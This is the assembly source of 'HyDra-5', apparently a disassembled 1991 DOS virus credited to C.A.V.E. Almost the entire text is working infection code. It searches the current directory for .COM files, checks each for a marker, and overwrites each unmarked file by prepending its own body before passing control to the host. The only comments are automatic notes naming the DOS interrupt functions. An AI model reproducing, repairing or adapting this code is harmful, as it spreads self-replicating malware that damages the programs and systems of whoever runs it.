
PAGE  59,132

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл								         лл
;лл			        HYDRA5				         лл
;лл								         лл
;лл      Created:   21-Aug-91					         лл
;лл      Passes:    5	       Analysis Options on: AW		         лл
;лл      Copyright (c)						         лл
;лл								         лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

data_1e		equ	23Eh
psp_cmd_size	equ	80h
data_17e	equ	187h
data_18e	equ	18Ah

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

hydra5		proc	far

start:
		jmp	loc_1
		pop	cx
		inc	sp
		add	[bx+si],al
data_4		db	'HyDra-5   Beta - Not For Release'
		db	'. *.CO?'
		db	0
data_7		dw	0, 8B39h
data_9		dw	0
data_10		db	0
		db	29 dup (0)
data_11		db	0
		db	13 dup (0)
copyright	db	'Copyright (c)'
		db	'  1991 by C.A.V.E.  '
loc_1:
		push	ax
		mov	ax,cs
		add	ax,1000h
		xor	di,di			; Zero register
		mov	cx,187h
		mov	si,100h
		mov	es,ax
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	ah,1Ah
		mov	dx,offset data_10
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		mov	ah,4Eh			; 'N'
		mov	dx,offset data_4+22h	; ('*')
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		jc	loc_5			; Jump if carry Set
loc_2:
		mov	ah,3Dh			; '='
		mov	al,2
		mov	dx,offset data_11
		mov	al,2
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		mov	bx,ax
		push	es
		pop	ds
		mov	ax,3F00h
		mov	cx,0FFFFh
		mov	dx,data_17e
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		add	ax,187h
		mov	cs:data_9,ax
		cmp	word ptr ds:data_18e,4459h
		jne	loc_3			; Jump if not equal
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		push	cs
		pop	ds
		mov	ah,4Fh			; 'O'
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
;*		jc	loc_6			; Jump if carry Set
		db	 72h, 54h
		jmp	short loc_2
loc_3:
		xor	cx,cx			; Zero register
		mov	dx,cx
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		jc	loc_4			; Jump if carry Set
		mov	ah,40h			; '@'
		xor	dx,dx			; Zero register
		mov	cx,cs:data_9
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
loc_4:
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		push	cs
		pop	ds
loc_5:
		mov	ah,1Ah
		mov	dx,psp_cmd_size
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		jmp	short loc_7
		nop
		inc	word ptr [bx+si]
		add	[bx+si],al
		add	[bx+si],al
		pop	ds
		add	[bx],bh
		aas				; Ascii adjust
		aas				; Ascii adjust
		aas				; Ascii adjust
		aas				; Ascii adjust
		aas				; Ascii adjust
		aas				; Ascii adjust
		aas				; Ascii adjust
		inc	bp
		pop	ax
		inc	bp
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	ds:data_1e[bx+si],bh
		push	ax
		push	cs
		pushf				; Push flags
		mov	cl,13h
		mov	dx,201h
		push	cs
		pop	ds
		jmp	dword ptr data_14
		mov	ah,4Ch			; 'L'
		int	21h			; DOS Services  ah=function 4Ch
						;  terminate with al=return code
data_14		dd	000C0h
		db	0CDh, 20h
loc_7:
		xor	di,di			; Zero register
		mov	si,265h
		mov	cx,22h
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		pop	bx
		mov	cs:data_7,0
		mov	word ptr cs:data_7+2,es
		pop	bx
		jmp	dword ptr cs:data_7
		push	ds
		pop	es
		mov	cx,0FFFFh
		mov	si,287h
		mov	di,100h
		sub	cx,si
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	word ptr cs:[100h],100h
		mov	word ptr cs:[102h],ds
		mov	ax,bx
		jmp	dword ptr cs:[100h]
		int	20h			; DOS program terminate

hydra5		endp

seg_a		ends



		end	start
